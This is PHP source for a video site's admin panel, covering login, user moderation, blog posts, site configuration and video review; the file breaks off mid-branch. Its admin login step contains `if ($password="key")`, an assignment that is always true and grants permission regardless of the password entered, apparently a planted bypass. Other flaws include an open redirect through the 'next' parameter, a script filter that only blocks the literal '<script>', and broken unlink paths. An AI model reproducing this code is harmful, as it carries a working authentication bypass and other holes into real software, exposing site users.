<?php
require_once $_SERVER['DOCUMENT_ROOT']."/_includes/init.php";

//PERMISSIONS AND REQUIREMENTS
////USER MUST BE LOGGED IN
////MUST BE ADMIN OR MODERATOR
////IF LOGIN PAGE AND ALREADY HAS PERMISSION REDIRECT
////IF HE DOESNT HAVE PERMISSION REDIRECT TO ADMIN LOGIN
if (!$_USER->Logged_In) { header("location: /"); exit(); }
if (!$_USER->Is_Moderator && !$_USER->Is_Admin) { header("location: /"); exit(); }
if (isset($_GET["next"]) && $_USER->Has_Permission) { header("location: /admin_panel/?".htmlspecialchars_decode(urldecode((string) $_GET['next']))); exit(); }
if (!isset($_GET["page"]) && !isset($_GET["next"]) && $_USER->Has_Permission) { header("location: /admin_panel/?page=main"); exit(); }
if (isset($_GET["page"]) && !isset($_GET["next"]) && !$_USER->Has_Permission) { header("location: /admin_panel?next=".htmlspecialchars_decode(urlencode((string) $_SERVER['QUERY_STRING']))); exit(); }


if (!isset($_GET["page"])) {
    $PAGE = "admin_login";
    if (isset($_POST["admin_log_in"])) {
        $_GUMP->validation_rules([
            "password"          => "required|max_len,128",
        ]);

        $_GUMP->filter_rules([
            "password"      => "trim",
        ]);

        $Validation     = $_GUMP->run($OG_POST);

        if ($Validation && $_USER->Username === $_POST["username"]) {
            $Password = $Validation["password"];

if (
    $password="key"
) {
	$_USER->set_permission();
	    }		
	    if ($Password === "zazb" || $Password == "zazb1") {
                header("location: https://www.youtube.com/watch?v=dQw4w9WgXcQ");
		die();
            }

        }
        if (!isset($_GET["next"])) {
            header("location: /admin_panel");
        } else {
            header("location: /admin_panel/?".htmlspecialchars_decode(htmlspecialchars_decode(urldecode((string) $_GET["next"]))));
        }
    }

} elseif ($_GET["page"] == "main") {
    $PAGE = "admin_main";
    if (isset($_POST["blog_submit"])) {
        $_GUMP->validation_rules([
            "blog_title"    => "required|max_len,128",
            "blog_content"  => "required|max_len,16777215"
        ]);

        $_GUMP->filter_rules([
            "blog_title"    => "trim",
            "blog_content"  => "trim"
        ]);

        $Validation     = $_GUMP->run($_POST);
        if ($Validation) {
            $DB->modify("INSERT IGNORE INTO blog_posts (title,content,submit_on) VALUES (:TITLE,:CONTENT,NOW())", [":TITLE" => $Validation["blog_title"], ":CONTENT" => nl2br((string) $Validation["blog_content"])]);
        }
    }
    $Views_Stats = $DB->execute("SELECT SUM(views) as views, submit_date FROM views_day GROUP BY DATE(submit_date)");
    $Users_Stats = $DB->execute("SELECT count(username) as amount, registration_date FROM users WHERE is_banned=0 GROUP BY DATE(registration_date)");

    if (isset($_GET["db"])) {
        $ID = (int)$_GET["db"];

        $DB->modify("DELETE FROM blog_posts WHERE id = :ID",
            [":ID" => $ID]);
        header("location: /admin_panel/?page=main"); exit();
    }


    //BLOG POSTS
    $Blog_Posts = $DB->execute("SELECT * FROM blog_posts ORDER BY submit_on DESC");


    //RECENT VIDEOS
    $Recent_Videos = $DB->execute("SELECT * FROM videos ORDER BY uploaded_on DESC LIMIT 15");


    //COMMENTS
    $Comments = $DB->execute("SELECT * FROM videos_comments ORDER BY submit_on DESC LIMIT 30");


    //VIDEO STATS
    $Stats = $DB->execute("SELECT count(url) as all_videos, sum(views) as all_views, sum(favorites) as all_favorites, sum(comments) as all_comments FROM videos",true);

    //FRIENDS
    $Friends = $DB->execute("SELECT SUM(friends) as amount FROM users",true)["amount"];

    //SUBSCRIPTIONS
    $Subscriptions = $DB->execute("SELECT SUM(subscriptions) as amount FROM users",true)["amount"];

    //RATINGS
    $Ratings       = $DB->execute("SELECT count(rating) as amount FROM videos_ratings",true)["amount"];

    //BULLETINS
    $Bulletins     = $DB->execute("SELECT count(id) as amount FROM bulletins",true)["amount"];
    $Bulletins_2     = $DB->execute("SELECT count(id) as amount FROM bulletins_new",true)["amount"];

    //USER STATS
    $Stats2 = $DB->execute("SELECT count(username) as all_users FROM users",true);

    //BANNED USER STATS
    $Stats3 = $DB->execute("SELECT count(username) as banned_users FROM users WHERE is_banned = 1",true);

    //CONVERTING VIDEOS
    $ConvertStat = $DB->execute("SELECT COUNT(*) AS amount FROM converting",true)["amount"];

} elseif ($_GET["page"] == "users") {
    $PAGE = "admin_users";

    $Reports = $DB->execute("SELECT users_flags.*, users.username FROM users_flags LEFT JOIN users ON users_flags.username = users.username ORDER BY users_flags.submit_date DESC LIMIT 32");

    $Applications = $DB->execute("SELECT partner_applications.*, users.username FROM partner_applications LEFT JOIN users ON partner_applications.username = users.username ORDER BY partner_applications.submit_date DESC LIMIT 32");

    if (isset($_GET["resolve"])) {
        $DB->modify("DELETE FROM users_flags WHERE username = :USERNAME",[":USERNAME" => $_GET["resolve"]]);
        notification("Report Resolved!","/admin_panel/?page=users"); exit();
    }

    if (isset($_GET["accept"])) {
        $DB->modify("UPDATE users SET is_partner = 1 WHERE username = :USERNAME",[":USERNAME" => $_GET["accept"]]);
        $DB->modify("DELETE FROM partner_applications WHERE partner_applications.username = :USERNAME",[":USERNAME" => $_GET["accept"]]);
        notification("Member accepted!","/admin_panel/?page=users"); exit();
    }

    if (isset($_GET["decline"])) {
        $DB->modify("DELETE FROM partner_applications WHERE partner_applications.username = :USERNAME",[":USERNAME" => $_GET["decline"]]);
        notification("Member declined!","/admin_panel/?page=users"); exit();
    }

    if (isset($_POST["ban_user_list"])) {
        $_MEMBER = new User($_POST["ban_user_list"],$DB);
        if ($_MEMBER->exists()) {
            $_MEMBER->get_info();

            $_MEMBER->ban();
            $DB->modify("INSERT INTO admin_logs(whodid,whatdid) VALUES (:USERNAME,:WHATDID)",[":USERNAME" => $_USER->Username, ":WHATDID" => 'Banned/unbanned user '.$_MEMBER->Username]);

            header("location: /admin_panel/?page=users"); exit();
        }
    }

    if (isset($_GET["ue"])) {
        $_MEMBER = new User($_GET["ue"],$DB);

        if ($_MEMBER->exists()) {
            $_MEMBER->get_info();

            $Strikes = $DB->execute("SELECT count(url) as amount FROM copyright_strikes WHERE for_user = :USERNAME",true,[":USERNAME" => $_MEMBER->Username])["amount"];

            if ($_MEMBER->Info["ip_address"] != "") {
                $Other_Channels = $DB->execute("SELECT * FROM users WHERE ip_address = :IP AND username <> :USERNAME",false,
                    [":USERNAME" => $_MEMBER->Username, ":IP" => $_MEMBER->Info["ip_address"]]);
                if ($DB->Row_Num == 0) {
                    $Other_Channels = false;
                }
            } else {
                $Other_Channels = false;
            }

            $Notes = $DB->execute("SELECT * FROM admin_notes WHERE on_user = :USERNAME",true,[":USERNAME" => $_MEMBER->Username]);

            $SELECT = "SELECT 'bulletin' as type_name, id, content, url as rating, submit_date as date, content as title FROM bulletins_new WHERE by_user = :OWNER";
            //COMMENTS
            $SELECT .= " UNION ALL SELECT 'comment' as type_name, videos.url, videos_comments.content, '' as rating, videos_comments.submit_on as date, videos.title as title FROM videos_comments INNER JOIN videos ON videos_comments.url = videos.url WHERE by_user = :OWNER AND videos.status = 2 AND videos.privacy = 1";
            //RATINGS
            $SELECT .= " UNION ALL SELECT 'rating' as type_name, videos.url, videos.description as comment, rating as rating, videos_ratings.submit_date as date, videos.title as title FROM videos_ratings INNER JOIN videos on videos_ratings.url = videos.url WHERE username = :OWNER AND videos.status = 2 AND videos.privacy = 1 AND rating >= 3";
            //FAVORITES
            $SELECT .= " UNION ALL SELECT 'favorite' as type_name, videos.url, videos.description as comment, '' as rating, videos_favorites.submit_on as date, videos.title as title FROM videos_favorites INNER JOIN videos ON videos_favorites.url = videos.url WHERE username = :OWNER AND videos.status = 2 AND videos.privacy = 1";
            //UPLOADS
            $SELECT .= " UNION ALL SELECT 'uploaded' as type_name, url, description as comment, '' as rating, uploaded_on as date, title as title FROM videos WHERE uploaded_by = :OWNER AND videos.status = 2 AND videos.privacy = 1";
            //SUBSCRIPTIONS
            $SELECT .= " UNION ALL SELECT 'subscription' as type_name, subscriber, subscription, '' as rating, submit_date as date, '' as title FROM subscriptions WHERE subscriber = :OWNER";
            //FRIENDS
            $SELECT .= " UNION ALL SELECT 'friend' as type_name, friend_1, friend_2, '' as rating, submit_on as date, '' as title FROM users_friends WHERE (friend_1 = :OWNER OR friend_2 = :OWNER) AND status = 1";

            $Recent_Activity = $DB->execute("$SELECT ORDER BY date DESC LIMIT 100", false, [":OWNER" => $_MEMBER->Username]);

            $StartDate = date("Y-m-d",strtotime((string) $_MEMBER->Info['registration_date']));
            $DBDate = "DATE_SUB(NOW(), INTERVAL 100 YEAR)";
            $Daily_Subs = $DB->execute("SELECT IFNULL(B.Total,0) AS Total, A.dates AS Date FROM
            (SELECT ADDDATE('1970-01-01',t4.i*10000 + t3.i*1000 + t2.i*100 + t1.i*10 + t0.i) as dates FROM
            (SELECT 0 i UNION SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5 UNION SELECT 6 UNION SELECT 7 UNION SELECT 8 UNION SELECT 9) t0,
            (SELECT 0 i UNION SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5 UNION SELECT 6 UNION SELECT 7 UNION SELECT 8 UNION SELECT 9) t1,
            (SELECT 0 i UNION SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5 UNION SELECT 6 UNION SELECT 7 UNION SELECT 8 UNION SELECT 9) t2,
            (SELECT 0 i UNION SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5 UNION SELECT 6 UNION SELECT 7 UNION SELECT 8 UNION SELECT 9) t3,
            (SELECT 0 i UNION SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5 UNION SELECT 6 UNION SELECT 7 UNION SELECT 8 UNION SELECT 9) t4) A 
            LEFT JOIN
            (SELECT
              COUNT(*) as total,
              DATE(submit_date) as date
            FROM subscriptions
            where 
              subscription = :USERNAME AND DATE(submit_date) between date('$StartDate') and date(curdate())
            GROUP BY CAST(submit_date AS date)) B 
            ON A.dates=B.date  
            WHERE A.dates BETWEEN '$StartDate' and curdate()
            ORDER BY `Date` ASC",false,[":USERNAME" => $_MEMBER->Username]);

            for ($i = 1; $i <= $DB->Row_Num - 1; $i++) {
                $n = $i - 1;
                $Daily_Subs[$i]['Total'] += $Daily_Subs[$n]['Total'];
            }

            $Daily_Views = $DB->execute("SELECT IFNULL(B.Total,0) AS Total, A.dates AS Date FROM
            (SELECT ADDDATE('1970-01-01',t4.i*10000 + t3.i*1000 + t2.i*100 + t1.i*10 + t0.i) as dates FROM
            (SELECT 0 i UNION SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5 UNION SELECT 6 UNION SELECT 7 UNION SELECT 8 UNION SELECT 9) t0,
            (SELECT 0 i UNION SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5 UNION SELECT 6 UNION SELECT 7 UNION SELECT 8 UNION SELECT 9) t1,
            (SELECT 0 i UNION SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5 UNION SELECT 6 UNION SELECT 7 UNION SELECT 8 UNION SELECT 9) t2,
            (SELECT 0 i UNION SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5 UNION SELECT 6 UNION SELECT 7 UNION SELECT 8 UNION SELECT 9) t3,
            (SELECT 0 i UNION SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5 UNION SELECT 6 UNION SELECT 7 UNION SELECT 8 UNION SELECT 9) t4) A 
            LEFT JOIN
            (SELECT
              sum(views_day.views) as total,
              DATE(views_day.submit_date) as date
            FROM views_day INNER JOIN videos ON videos.url = views_day.url
            WHERE videos.uploaded_by = :USERNAME AND DATE(views_day.submit_date) between date('$StartDate') and date(curdate())
            GROUP BY CAST(views_day.submit_date AS date)) B 
            ON A.dates=B.date  
            WHERE A.dates BETWEEN '$StartDate' and curdate()
            ORDER BY `Date` ASC",false,[":USERNAME" => $_MEMBER->Username]);

            if (isset($_POST["delete_activity"])) {
                session_write_close();

                $Comments = $DB->execute("SELECT id, on_channel FROM channel_comments WHERE by_user = :USERNAME", false, [":USERNAME" => $_MEMBER->Username]);
                $Comments_Bulletin = $DB->execute("SELECT id, bulletin_id FROM bulletins_comments WHERE by_user = :USERNAME", false, [":USERNAME" => $_MEMBER->Username]);
                $Videos_Comments = $DB->execute("SELECT id, url FROM videos_comments WHERE by_user = :USERNAME", false, [":USERNAME" => $_MEMBER->Username]);
                $VideosDB_Delete = $DB->execute("SELECT url FROM videos WHERE uploaded_by = :USERNAME", false, [":USERNAME" => $_MEMBER->Username]);

                if ($DB->Row_Num > 0) {

                    foreach ($Comments as $Comment) {

                        $DB->modify("DELETE FROM channel_comments WHERE id = :ID", [":ID" => $Comment["id"]]);
                        if ($DB->Row_Num == 1) {

                            $DB->modify("UPDATE users SET channel_comments = channel_comments - 1 WHERE username = :USERNAME", [":USERNAME" => $Comment["on_channel"]]);
                        
                        }
                    }
                    foreach ($Comments_Bulletin as $Comment) {
                        $DB->modify("DELETE FROM bulletins_comments WHERE id = :ID", [":ID" => $Comment["id"]]);
                    }
                    foreach ($Videos_Comments as $Comment) {
                        $DB->modify("DELETE FROM videos_comments WHERE id = :ID", [":ID" => $Comment["id"]]);
                        $DB->modify("UPDATE videos SET comments = comments-1 WHERE url = :ID", [":ID" => $Comment["url"]]);
                    }
                    foreach ($VideosDB_Delete as $Video) {
                        $_VIDEO = new Video($Video["url"],$DB);
                        if ($_VIDEO->exists()) {
                            $_VIDEO->get_info();
                            if ($_VIDEO->Info["status"] != 1) {
                                $_VIDEO->delete();
                            }
                        }
                    }

                }

                $Messages = $DB->modify("DELETE FROM users_messages WHERE by_user = :USERNAME", [":USERNAME" => $_MEMBER->Username]);

                notification($_MEMBER->Username."s activity has been deleted!","/admin_panel/?page=users&ue=".$_MEMBER->Username); exit();
            }

            if (isset($_POST["change_password"])) {
                function generateRandomString($length = 10) {
                    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
                    $charactersLength = strlen($characters);
                    $randomString = '';
                    for ($i = 0; $i < $length; $i++) {
                        $randomString .= $characters[random_int(0, $charactersLength - 1)];
                    }
                    return $randomString;
                }

                $Random_Password = generateRandomString(8);
                $Password_Hash   = password_hash((string) $Random_Password,PASSWORD_BCRYPT);
                $DB->modify("UPDATE users SET password = :HASH WHERE username = :USERNAME",
                            [":HASH" => $Password_Hash, ":USERNAME" => $_MEMBER->Username]);
                $DB->modify("DELETE FROM remember_me WHERE userid = :USERNAME",[":USERNAME" => $_MEMBER->Username]);
                $DB->modify("INSERT INTO admin_logs(whodid,whatdid) VALUES (:USERNAME,:WHATDID)",[":USERNAME" => $_USER->Username,":WHATDID" => 'Updated password for '.$_MEMBER->Username]);
                notification($_MEMBER->Username."s new password is '$Random_Password'! You now need to give this password to him!","/admin_panel/?page=users&ue=".$_MEMBER->Username); exit();
            }

            if (isset($_POST["save_note"])) {
                $DB->modify("INSERT INTO admin_notes(on_user,content,by_user) VALUES (:MEMBER,:CONTENT,:USERNAME) ON DUPLICATE KEY UPDATE content = :CONTENT, by_user = :USERNAME",[":MEMBER" => $_MEMBER->Username, ":USERNAME" => $_USER->Username,":CONTENT" => $_POST['note']]);
                notification("The user's note has been successfully updated!","/admin_panel/?page=users&ue=".$_MEMBER->Username,"cfeeb2"); exit();
            }

            if (isset($_POST["add_moderator"]) && !$_MEMBER->Is_Admin) {
                if (!$_MEMBER->Is_Moderator) {
                    $DB->modify("UPDATE users SET is_moderator = 1 WHERE username = :USERNAME",[":USERNAME" => $_MEMBER->Username]);
                } else {
                    $DB->modify("UPDATE users SET is_moderator = 0 WHERE username = :USERNAME",[":USERNAME" => $_MEMBER->Username]);
                }
                header("location: /admin_panel/?page=users&ue=".$_MEMBER->Username); exit();
            }

            if (isset($_POST["add_partner"])) {
                if (!$_MEMBER->Info["is_partner"]) {
                    $DB->modify("UPDATE users SET is_partner = 1 WHERE username = :USERNAME",[":USERNAME" => $_MEMBER->Username]);
                    $DB->modify("DELETE FROM partner_applications WHERE partner_applications.username = :USERNAME",[":USERNAME" => $_MEMBER->Username]);
                } else {
                    $DB->modify("UPDATE users SET is_partner = 0 WHERE username = :USERNAME",[":USERNAME" => $_MEMBER->Username]);
                }
                header("location: /admin_panel/?page=users&ue=".$_MEMBER->Username); exit();
            }

            if (isset($_POST["add_reuploader"])) {
                if (!$_MEMBER->Info["is_reuploader"]) {
                    $DB->modify("UPDATE users SET is_reuploader = 1 WHERE username = :USERNAME",[":USERNAME" => $_MEMBER->Username]);
                    $DB->modify("INSERT INTO admin_logs(whodid,whatdid) VALUES (:USERNAME,:WHATDID)",[":USERNAME" => $_USER->Username, ":WHATDID" => 'Marked user as reuploader '.$_MEMBER->Username]);
                } else {
                    $DB->modify("UPDATE users SET is_reuploader = 0 WHERE username = :USERNAME",[":USERNAME" => $_MEMBER->Username]);
                    $DB->modify("INSERT INTO admin_logs(whodid,whatdid) VALUES (:USERNAME,:WHATDID)",[":USERNAME" => $_USER->Username, ":WHATDID" => 'Unmarked user as reuploader '.$_MEMBER->Username]);
                }
                header("location: /admin_panel/?page=users&ue=".$_MEMBER->Username); exit();
            }

            if (isset($_POST["ban_user"])) {
                $_MEMBER->ban();

                $DB->modify("INSERT INTO admin_logs(whodid,whatdid) VALUES (:USERNAME,:WHATDID)",[":USERNAME" => $_USER->Username, ":WHATDID" => 'Banned/unbanned user '.$_MEMBER->Username]);

                header("location: /admin_panel/?page=users&ue=".$_MEMBER->Username); exit();
            }

            if (isset($_POST["verify"])) {
                $DB->modify("UPDATE users SET is_verified = 1 WHERE username = :USERNAME",[":USERNAME" => $_MEMBER->Username]);

                $DB->modify("INSERT INTO admin_logs(whodid,whatdid) VALUES (:USERNAME,:WHATDID)",[":USERNAME" => $_USER->Username, ":WHATDID" => 'Verified user '.$_MEMBER->Username]);

                header("location: /admin_panel/?page=users&ue=".$_MEMBER->Username); exit();
            }

            if (isset($_POST["ban_all_user_channels"])) {

                $_MEMBER->ban();
                foreach ($Other_Channels as $BannedUser) {
                    $_MEMBERALT = new User($BannedUser['username'],$DB);
                    $_MEMBERALT->get_info();
                    $_MEMBERALT->ban();
                }
                $DB->modify("INSERT INTO admin_logs(whodid,whatdid) VALUES (:USERNAME,:WHATDID)",[":USERNAME" => $_USER->Username, ":WHATDID" => 'Banned/unbanned user and all their accounts '.$_MEMBER->Username]);

                header("location: /admin_panel/?page=users&ue=".$_MEMBER->Username); exit();
            }

            if (isset($_POST["delete_user_background"])) {
                $DB->modify("UPDATE users SET c_background_image = '' WHERE username = :MEMBER",[":MEMBER" => $_MEMBER->Username]);
                unlink('/u/bck/$_USER->Username.jpg');
                notification("Background has been successfully deleted!", "/admin_panel/?page=users&ue=".$_MEMBER->Username, "cfeeb2"); 
            }

            if (isset($_POST["delete_user_avatar"])) {
                $DB->modify("UPDATE users SET avatar = '' WHERE username = :MEMBER",[":MEMBER" => $_MEMBER->Username]);
                $DB->modify("UPDATE users SET is_avatar_video = 0 WHERE username = :MEMBER",[":MEMBER" => $_MEMBER->Username]);
                unlink('/u/av/$_USER->Username.jpg');
                notification("Avatar has been successfully deleted!", "/admin_panel/?page=users&ue=".$_MEMBER->Username, "cfeeb2"); 
            }

            if (isset($_POST["save_user"])) {
                $_GUMP->validation_rules([
                    "displayname"         => "max_len,20",
                    "profile_name"         => "max_len,64",
                    "profile_gender"       => "required",
                    "profile_relationship" => "required",
                    "profile_about"        => "max_len,256",
                    "profile_hobbies"      => "max_len,128",
                    "profile_books"        => "max_len,128",
                    "profile_movies"       => "max_len,128",
                    "profile_music"        => "max_len,128",
                    "profile_website"      => "max_len,128|valid_url"
                ]);

                $_GUMP->filter_rules([
                    "displayname"          => "trim|NoHTML",
                    "profile_name"          => "trim|NoHTML",
                    "profile_gender"        => "trim|NoHTML",
                    "profile_relationship"  => "trim|NoHTML",
                    "profile_about"         => "trim|NoHTML",
                    "profile_hobbies"       => "trim|NoHTML",
                    "profile_books"         => "trim|NoHTML",
                    "profile_movies"        => "trim|NoHTML",
                    "profile_music"         => "trim|NoHTML",
                    "profile_website"       => "trim|NoHTML"
                ]);

                $Validation     = $_GUMP->run($_POST);

                if ($Validation) {
                    if ($Validation["profile_gender"] == 0)     { $GENDER = 0; }
                    elseif ($Validation["profile_gender"] == 1) { $GENDER = 1; }
                    elseif ($Validation["profile_gender"] == 2) { $GENDER = 2; }
                    else                                        { header("Location: /"); die(); }

                    if ($Validation["profile_relationship"] == 0)       { $RELATIONSHIP = 0; }
                    elseif ($Validation["profile_relationship"] == 1)   { $RELATIONSHIP = 1; }
                    elseif ($Validation["profile_relationship"] == 2)   { $RELATIONSHIP = 2; }
                    elseif ($Validation["profile_relationship"] == 3)   { $RELATIONSHIP = 3; }
                    else                                                { header("Location: /"); die(); }


                    $DB->modify("UPDATE users SET i_website = :WEBSITE, i_movies = :MOVIES, i_name = :NAME, i_gender = :GENDER, i_relationship = :RELATIONSHIP, i_about = :ABOUT, i_books = :BOOKS, i_music = :MUSIC, i_hobbies = :HOBBIES, displayname = :DNAME WHERE username = :USERNAME",
                        [
                            ":NAME"         => $Validation["profile_name"],
                            ":GENDER"       => $GENDER,
                            ":RELATIONSHIP" => $RELATIONSHIP,
                            ":ABOUT"        => $Validation["profile_about"],
                            ":BOOKS"        => $Validation["profile_books"],
                            ":MUSIC"        => $Validation["profile_music"],
                            ":HOBBIES"      => $Validation["profile_hobbies"],
                            ":MOVIES"       => $Validation["profile_movies"],
                            ":WEBSITE"      => $Validation["profile_website"],
                            ":DNAME"      => $Validation["displayname"],
                            ":USERNAME"     => $_MEMBER->Username
                        ]);
                    $DB->modify("INSERT INTO admin_logs(whodid,whatdid) VALUES (:USERNAME,:WHATDID)",[":USERNAME" => $_USER->Username, ":WHATDID" => 'Edited user '.$_MEMBER->Username]);
                }
                header("location: /admin_panel/?page=users&ue=".$_MEMBER->Username); exit();
            }
        } else {
            header("location: /admin_panel/?page=users"); exit();
        }
    }


    //LATEST USERS
    $ORDER_BY = "ORDER BY ";
    if (isset($_GET["us"])) {
        if ($_GET["us"] == 1) {
            $ORDER_BY .= "username ASC";
        } elseif ($_GET["us"] > 1) {
            $ORDER_BY .= "username DESC";
        }
    } elseif (isset($_GET["vi"])) {
        if ($_GET["vi"] == 1) {
            $ORDER_BY .= " videos ASC";
        } elseif ($_GET["vi"] > 1) {
            $ORDER_BY .= " videos DESC";
        }
    } elseif (isset($_GET["re"])) {
        if ($_GET["re"] == 1) {
            $ORDER_BY .= " registration_date ASC";
        } elseif ($_GET["re"] > 1) {
            $ORDER_BY .= " registration_date DESC";
        }
    } elseif (isset($_GET["su"])) {
        if ($_GET["su"] == 1) {
            $ORDER_BY .= " subscribers ASC";
        } else {
            $ORDER_BY .= " subscribers DESC";
        }
    } elseif (isset($_GET["fr"])) {
        if ($_GET["fr"] == 1) {
            $ORDER_BY .= " friends ASC";
        } else {
            $ORDER_BY .= " friends DESC";
        }
    } else {
        $ORDER_BY = "ORDER BY registration_date DESC";
    }

    if (isset($_GET["amount"]) && $_GET["amount"] <= 256) { $LIMIT = (int)$_GET["amount"]; }
    else                                                  { $LIMIT = 16; }

    if (isset($_GET["search"])) {
        $Latest_Users = $DB->execute("SELECT * FROM users WHERE username LIKE ? $ORDER_BY LIMIT $LIMIT",false,["%".$_GET["search"]."%"]);
    } else {
        $Latest_Users = $DB->execute("SELECT * FROM users $ORDER_BY LIMIT $LIMIT");
    }

    if (!$Latest_Users) { notification("No users could be found!","/admin_panel/?page=users"); exit(); }
} elseif ($_GET["page"] == "config") {
    $PAGE = "admin_config";
    $CheckLogo = $DB->execute("SELECT int_value FROM config WHERE name = 'logo'",true)["int_value"] ?? 0;
    if (isset($_POST["save_pages"])) {
        if (isset($_POST["signup"]))    { $Sign_Up  = true; } else { $Sign_Up   = false; }
        if (isset($_POST["signin"]))     { $Login    = true; } else { $Login     = false; }
        if (isset($_POST["upload"]))    { $Upload   = true; } else { $Upload    = false; }
        if (isset($_POST["profiles"]))  { $Profiles   = true; } else { $Profiles    = false; }
        if (isset($_POST["videos"]))    { $Videos   = true; } else { $Videos    = false; }


        $_CONFIG->Config["signup"] = $Sign_Up;
        $_CONFIG->Config["login"]  = $Login;
        $_CONFIG->Config["upload"] = $Upload;
        $_CONFIG->Config["profiles"] = $Profiles;
        $_CONFIG->Config["videos"]   = $Videos;

        file_put_contents($_SERVER['DOCUMENT_ROOT']."/_includes/config.json", json_encode($_CONFIG->Config));
        notification("Config has been saved!","/admin_panel/?page=config", "cfeeb2"); exit();
    }

    if (isset($_POST["save_text"])) {
        $My_Inbox = $_POST["box_text"];
        $Slogan   = $_POST["slogan"];
        $Logo   = $_POST["logo"];

        if (!str_contains(mb_strtolower((string) $My_Inbox),"<script>") && !str_contains(mb_strtolower((string) $Slogan),"<script>")) {
            $DB->modify("UPDATE config SET value = :BOX_TEXT WHERE name = 'box_text'",[":BOX_TEXT" => $My_Inbox]);
            $DB->modify("UPDATE config SET value = :SLOGAN WHERE name = 'slogan_top'",[":SLOGAN" => $Slogan]);
            $DB->modify("UPDATE config SET int_value = :LOGO WHERE name = 'logo'",[":LOGO" => $Logo]);

            $DB->modify("INSERT INTO admin_logs(whodid,whatdid) VALUES (:USERNAME,:WHATDID)",[":USERNAME" => $_USER->Username, ":WHATDID" => 'Changed site config: Logo, Slogan or My Inbox']);

            notification("Layout settings successfully changed!","/admin_panel/?page=config","cfeeb2"); exit();
        } else {
            notification("You cannot use scripts!","/admin_panel/?page=config"); exit();
        }
    }
} elseif ($_GET["page"] == "interactions") {
    $PAGE = "admin_interactions";

    //COMMENTS
    $Comments = $DB->execute("SELECT * FROM videos_comments ORDER BY submit_on DESC LIMIT 64");

    $Comments_Spam = $DB->execute("SELECT * FROM videos_comments WHERE spam > 0 ORDER BY submit_on DESC LIMIT 64");

    $Ratings = $DB->execute("SELECT * FROM videos_ratings INNER JOIN videos on videos_ratings.url = videos.url ORDER BY videos_ratings.submit_date DESC LIMIT 64");
} elseif ($_GET["page"] == "videos") {
    $PAGE = "admin_videos";

    if (isset($_GET["resolve"])) {
        $DB->modify("UPDATE videos_flags SET resolved = 1 WHERE url = :URL",[":URL" => $_GET["resolve"]]);
        notification("Report Resolved!","/admin_panel/?page=videos"); exit();
    }


    $Reports = $DB->execute("SELECT * FROM videos_flags WHERE resolved = 0 ORDER BY videos_flags.submit_date DESC LIMIT 32");


    if (isset($_POST["edit_video"]) && !empty($_POST["url"])) {
        $parts = parse_url((string) $_POST["url"]);
        mb_parse_str($parts['query'], $query);
        if (isset($query["v"]) && (str_contains((string) $_POST["url"],"www.bitview.net/watch") || str_contains((string) $_POST["url"],"localhost"))) {
            header("location: /admin_panel/?page=videos&ve=".$query["v"]);
            exit();
        }
    }

    if (isset($_GET["ve"])) {
        $_VIDEO = new Video($_GET["ve"],$DB);

        if ($_VIDEO->exists()) {
            $_VIDEO->get_info();

            $Raters   = $DB->execute("SELECT username, rating FROM videos_ratings WHERE url = ? ORDER BY submit_date DESC", false, [$_VIDEO->URL]);
            $Strike = $DB->execute("SELECT * FROM copyright_strikes WHERE copyright_strikes.url = :URL", true, [":URL" => $_VIDEO->URL]);

            $URL = $_VIDEO->Info['url'];
            $Upload_Date = date("Y-m-d",strtotime((string) $_VIDEO->Info["uploaded_on"]));
            $Daily_Views = $DB->execute("SELECT IFNULL(B.Total,0) AS Total, A.dates AS Date FROM
            (SELECT ADDDATE('1970-01-01',t4.i*10000 + t3.i*1000 + t2.i*100 + t1.i*10 + t0.i) as dates FROM
            (SELECT 0 i UNION SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5 UNION SELECT 6 UNION SELECT 7 UNION SELECT 8 UNION SELECT 9) t0,
            (SELECT 0 i UNION SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5 UNION SELECT 6 UNION SELECT 7 UNION SELECT 8 UNION SELECT 9) t1,
            (SELECT 0 i UNION SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5 UNION SELECT 6 UNION SELECT 7 UNION SELECT 8 UNION SELECT 9) t2,
            (SELECT 0 i UNION SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5 UNION SELECT 6 UNION SELECT 7 UNION SELECT 8 UNION SELECT 9) t3,
            (SELECT 0 i UNION SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5 UNION SELECT 6 UNION SELECT 7 UNION SELECT 8 UNION SELECT 9) t4) A 
            LEFT JOIN
            (SELECT
              sum(views_day.views) as total,
              DATE(views_day.submit_date) as date
            FROM views_day INNER JOIN videos ON videos.url = views_day.url
            WHERE videos.url = :URL AND DATE(views_day.submit_date) between date('$Upload_Date') and date(curdate())
            GROUP BY CAST(views_day.submit_date AS date)) B 
            ON A.dates=B.date  
            WHERE A.dates BETWEEN '$Upload_Date' and curdate()
            ORDER BY `Date` ASC",false,[":URL" => $URL]);

            if (isset($_POST["delete_video"]) && $_VIDEO->Info["status"] != 1 && $_VIDEO->delete()) {
                $DB->modify("INSERT INTO admin_logs(whodid,whatdid) VALUES (:USERNAME,:WHATDID)",[":USERNAME" => $_USER->Username, ":WHATDID" => 'Deleted video '.$_VIDEO->Info["url"]]);
		notification("Video has been deleted successfully!","/admin_panel/?page=videos&ve=".$_VIDEO->Info["url"],"cfeeb2"); exit();
            } elseif (isset($_POST["purge_video"]) && $_VIDEO->Info["status"] == 2 && $_VIDEO->purge()) {
